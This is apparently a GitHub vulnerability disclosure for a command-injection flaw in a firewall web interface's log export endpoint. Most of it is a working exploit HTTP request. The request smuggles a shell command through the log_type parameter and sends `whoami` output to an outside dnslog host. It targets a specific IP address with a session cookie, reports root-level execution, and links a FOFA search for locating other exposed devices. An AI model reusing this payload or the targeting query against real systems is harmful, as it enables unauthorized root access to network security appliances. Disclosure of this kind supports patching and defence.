# code exec
In `webui/modules/log/fw_security.mds` after accepting the log_type parameter, without any filtering, it is directly spliced into the $table variable, and passed into exec, resulting in code execution.
![image](https://github.com/night-0p/CVE/assets/54882616/3fd651bf-98e3-4e86-a844-0f42f3099088)
test steps:  
1， First obtain a dnslog domain name through http://dnslog.cn/  
2，send exp:  
```
GET /webui/?g=log_fw_export&log_type=%26/bin/?ing${IFS}`whoami`.9ud6dz.dnslog.cn HTTP/1.1
Host: 183.230.154.102:4443
Cookie: USGSESSID=8944257a6431dd049e456e23cf40833b
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "macOS"
Origin: https://183.230.154.102:4443
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://183.230.154.102:4443/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```
The following is the result of executing `whoami`. root authority.  
<img width="1247" alt="image" src="https://github.com/night-0p/CVE/assets/54882616/4fc5085b-9000-4283-a242-b557c69b2bba">  
this Website fingerprinting:  
https://fofa.info/result?qbase64=YXBwPSLlronmgZLkv6Hmga8t5piO5b6h5a6J5YWo572R5YWzIg%3D%3D
